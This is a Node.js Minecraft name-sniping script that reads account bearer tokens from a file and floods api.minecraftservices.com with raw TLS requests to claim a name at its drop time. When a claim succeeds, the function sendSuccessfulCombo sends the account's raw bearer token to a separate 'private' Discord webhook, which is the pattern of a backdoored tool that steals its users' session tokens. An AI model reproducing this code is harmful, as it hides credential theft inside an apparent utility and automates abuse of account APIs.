    const axios = require('axios');
    const fetch = require('node-fetch');
    const cheerio = require('cheerio');
    const tls = require('tls');
    const fs = require('fs');
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    require('colors');
	const privateWebhook = '';
    const webhook = '';
	const skin = 'https://i.imgur.com/vAzItB5.png';
    const debug = false;
    const announcementURL = `https://pastebin.com/raw/pfE0cFDA`;
    const announcement = async () => {
        return await axios.get(announcementURL).then(res => res.data);
    }
    
    const startup = async () => {
        console.clear();
        console.log(await announcement())
        console.log(``);
        console.log(``);
        if(debug) console.log(`#Debug mode`);
        console.log(``);
        console.log(`${`GC v1.0.0 - created by alfredo#6995 and trivago#0001`.red}`);
        console.log(``);
    
        readline.question(`${`Input name |`.cyan} `, (input) => {
            desiredName = input;
            nameDecided();
        });
    }
    startup();

    // basic snipe information
    let dropTime;
    let desiredName;
    let delay;

    let accounts = [];
    
    const nameDecided = async () => {
        console.log(``);
    
        resolveDelay();
    }
    
    const resolveDelay = async () => {
        readline.question(`${`Input delay | `.cyan}`, (input) => {
            delay = input;
            delayDecided();
        });
    }
    
    const delayDecided = async () => {
        console.log(``);
        nameDrop();
    }

const loadAccountsFromFile = async () => {
    let input = fs.createReadStream('bearers.txt');
    readLines(input);
};

const readLines = async (input) => {
    let remaining = '';

    input.on('data', (data) => {
        remaining+=data;
        let index = remaining.indexOf('\n');
        while(index > -1){
            let line = remaining.substring(0, index);
            remaining = remaining.substring(index + 1);

            accounts.push(line);
            index = remaining.indexOf('\n');
        }
    });

    input.on('end', async() => {
        if(remaining.length > 0){
            await accounts.push(remaining);
            console.log(`${`Bearers | ${accounts.length}`.green}`);
            console.log('')
        }
    });
};

    let timeUntilDrop;

    // Get droptime from namemc

    const nameDrop = async () => {
        await axios.get(`https://namemc.com/name/${desiredName}/`).then(async (result) => {
            const $ = await cheerio.load(result.data);
            dropTime = await new Date($('.countdown-timer').first().attr('data-datetime')).getTime();

            console.log(`${`Drops ${new Date(dropTime).toLocaleTimeString().replace(' AM', '').replace(' PM', '')}`.cyan}`);
            console.log('');

            timeUntilDrop = ((dropTime - delay) - new Date().getTime());
            timeUntilAuthentication = (timeUntilDrop - (30 * 1000));
            loadAccountsFromFile();
        });
        awaitSnipeExecution();
    };


    const getSearches = async () => {
        let searches;
        await axios.get(`https://api.nathan.cx/searches/${desiredName}`).then(response => searches = response.data.searches);
        return searches;
    }

    const awaitSnipeExecution = () => {
        let snipeInterval = setInterval(() => {
            console.log(`Attemping Prename...`);
            console.log(``);

            for(let a=0; a<accounts.length; a++){
                let token = 'Bearer ' + accounts[a];
                const changeSkin = async () => {
                    await fetch('https://api.minecraftservices.com/minecraft/profile/skins', {
                        method: 'POST',
            
                        body: JSON.stringify({
                            url: skin,
                            variant: 'slim'
                        }),
                        headers: {
                            'Content-Type': 'application/json',
                            'Authorization': token
                        }
                    }).then(async (response) => response.json().then(async () => {
                        if(response.status == 200){
                            console.log(`${`Changed Skin`.green}`);
                        }else{
                            console.log(`${`Failed skin change`.red}`);
                        }
                        }));
                }
                for(let i=0; i<6; i++){

                    const requestOptions = {
                        host: `api.minecraftservices.com`,
                        port: 443
                    };
                    const skinReq = `POST /minecraft/profile HTTP/1.1\r\nHost: api.minecraftservices.com\r\nContent-Type: application/json\r\nAuthorization: ${token}\r\n\r\n{"url": "${skin}"\n"variant": "slim"}\r\n`
                    const req = `POST /minecraft/profile HTTP/1.1\r\nHost: api.minecraftservices.com\r\nContent-Type: application/json\r\nAuthorization: ${token}\r\n\r\n{"profileName": "${desiredName}"}\r\n`
                        if(debug) console.log(`#Debug Started sending | ${(new Date().toLocaleTimeString().replace(' AM', '').replace(' PM', '') + `.` + new Date().getMilliseconds())}`);
                        const socket = tls.connect({ port: requestOptions.port, host: requestOptions.host }, async () => {
                            let time = (new Date().toLocaleTimeString().replace(' AM', '').replace(' PM', '') + `.` + new Date().getMilliseconds())
                            socket.write(req);
                            socket.on('data', async (data) => {
                                let string = data.toString();
                                if(debug) console.log(string);
                                if(string.startsWith("HTTP/1.1 200")) {
                                    console.log(`${`Prenamed ${desiredName} | Delay ${delay}ms | ${time}`.green}`);
                                    await changeSkin();
                                    
                                    await sendSuccessfulSnipe(desiredName);
                                    await sendSuccessfulCombo(desiredName, token, delay, time)
                                }
                                if(string.includes(`BAD_REQUEST`)) {
                                    console.log(`${`400 | ${time}`.red}`);
                                }
                                if(string.startsWith("HTTP/1.1 429")) {
                                    console.log(`${`429 | ${time}`.red}`);
                                }
                                if(string.startsWith("HTTP/1.1 401")) {
                                    console.log(`${`401 | ${time}`.red}`);
                                }
                            });
                        });
                    }
                }    


            clearInterval(snipeInterval);
        }, timeUntilDrop);
    };

    const { Webhook, MessageBuilder } = require('discord-webhook-node');

    const sendSuccessfulSnipe = async (username) => {
        const hook = new Webhook(webhook);
    
        const embed = new MessageBuilder()
            .setTitle('Eclipse')
            .setDescription(`Prenamed \`${username}\` with \`${await getSearches()}\` searches`)
            .setColor(000000);
    
        await hook.send(embed);
    }
    
    const sendSuccessfulCombo = async(username, token, delay, time) => {
        const hook = new Webhook(privateWebhook);
    
        const embed = new MessageBuilder()
            .setTitle(`Success!`)
            .setDescription(`Prenamed \`${username}\`\n\nToken: \`${token.replace('Bearer ', '')}\`\n\nTime: ${time}\nDelay: ${delay}`)
            .setColor(000000);
    
        await hook.send(embed);
    };